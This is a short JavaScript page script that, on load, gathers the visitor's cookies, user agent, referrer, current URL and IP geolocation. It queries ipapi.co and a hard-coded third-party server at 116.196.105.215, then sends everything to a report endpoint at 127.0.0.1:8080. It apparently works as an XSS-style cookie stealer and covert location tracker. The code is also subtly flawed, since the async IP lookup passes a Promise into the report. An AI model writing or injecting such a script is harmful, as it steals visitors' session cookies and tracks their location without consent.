window.addEventListener("load", function (event) {
    let urlObj = {
        method: 'get',
        url: 'http://127.0.0.1:8080/report',
        params: {
            time: getTime(),
            ipinfo: getIpinfo(),
            url: getUrl(),
            refer: getRefer(),
            agent: getAgent(),
            cookie: getCookie(),
        },
    };
    axios(urlObj);
});

function getTime() {
    let nowDate = new Date();
    return nowDate.toLocaleDateString();
}
async function getIpinfo() {
    let ipInfo = await axios({
        method: 'get',
        url: 'https://ipapi.co/json',
    }).then((result) => {
        console.log('请求IP');
        
        console.log(result.data);
        return result.data
    }).catch((err) => {
        console.log('请求ip信息出错');
        console.log(err);  
    });
    await axios({
        method: 'get',
        url: 'http://116.196.105.215:1234/gis',
        params: {
            auth_user: 'freevip',
            latitude: ipInfo.latitude,
            longitude: ipInfo.longitude
        },
    }).then((result) => {
        console.log('请求地址');
        console.log(result);
        let location = result.data.data;
        ipInfo.location = location;
    }).catch((err) => {
        console.log('请求地址信息出错');
        console.log(err); 
    });
    console.log('最终结果');
    console.log(ipInfo);
    
    return ipInfo;
}
function getUrl() {
    return window.location.href
}
function getRefer() {
    return document.referrer;
}
function getAgent() {
    return navigator.userAgent;
}
function getCookie() {
    return document.cookie;
}